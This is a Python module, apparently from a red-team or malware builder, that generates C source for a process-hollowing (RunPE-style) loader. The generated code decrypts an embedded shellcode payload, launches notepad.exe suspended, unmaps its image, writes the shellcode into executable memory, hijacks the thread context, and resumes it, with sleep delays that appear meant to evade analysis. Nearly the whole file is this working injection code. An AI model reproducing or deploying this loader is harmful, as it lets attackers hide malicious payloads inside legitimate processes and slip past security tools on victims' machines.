#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""C source generator for process hollowing (RunPE-style shellcode injection)."""

from __future__ import annotations

from lib.compile.injection_common import InjectionBuilder


class ProcessHollowingBuilder(InjectionBuilder):
    def build_source(
        self,
        encoded_payload: str,
        key: bytes,
        iv=None,
        *,
        target_path: str = r"C:\Windows\System32\notepad.exe",
    ) -> str:
        target = target_path.replace("\\", "\\\\").replace('"', '\\"')
        return f"""
{chr(10).join(self.headers())}
{self.ntdll_typedefs()}

char* enc_payload = "{encoded_payload}";
char* target_process = "{target}";

static BOOL hollow_process(PBYTE shellcode, SIZE_T size)
{{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    CONTEXT ctx;
    PROCESS_BASIC_INFORMATION pbi;
    PVOID image_base = NULL;
    SIZE_T bytes = 0;
    pNtUnmapViewOfSection NtUnmapViewOfSection;
    pNtQueryInformationProcess NtQueryInformationProcess;
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PVOID remote = NULL;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);

    if (!CreateProcessA(target_process, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
        return FALSE;

    NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
    if (!NtUnmapViewOfSection || !NtQueryInformationProcess)
        goto cleanup;

    ZeroMemory(&pbi, sizeof(pbi));
    if (NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL) < 0)
        goto cleanup;

    if (!ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x10, &image_base, sizeof(image_base), &bytes))
        goto cleanup;

    NtUnmapViewOfSection(pi.hProcess, image_base);

    remote = VirtualAllocEx(pi.hProcess, image_base, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote)
        remote = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote)
        goto cleanup;

    if (!WriteProcessMemory(pi.hProcess, remote, shellcode, size, NULL))
        goto cleanup;

    ZeroMemory(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx))
        goto cleanup;

    ctx.Rip = (DWORD64)remote;
    if (!SetThreadContext(pi.hThread, &ctx))
        goto cleanup;

    {self.sleep_block()}
    ResumeThread(pi.hThread);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;

cleanup:
    if (pi.hThread) CloseHandle(pi.hThread);
    if (pi.hProcess) TerminateProcess(pi.hProcess, 1);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    return FALSE;
}}

int main(void)
{{
{self.decode_preamble()}
{self.decrypt_block(key, iv)}
    {self.sleep_block()}
    if (!hollow_process(shellcode_buf, payload_size)) return 1;
    VirtualFree(shellcode_buf, 0, MEM_RELEASE);
    free(decoded);
    return 0;
}}
"""
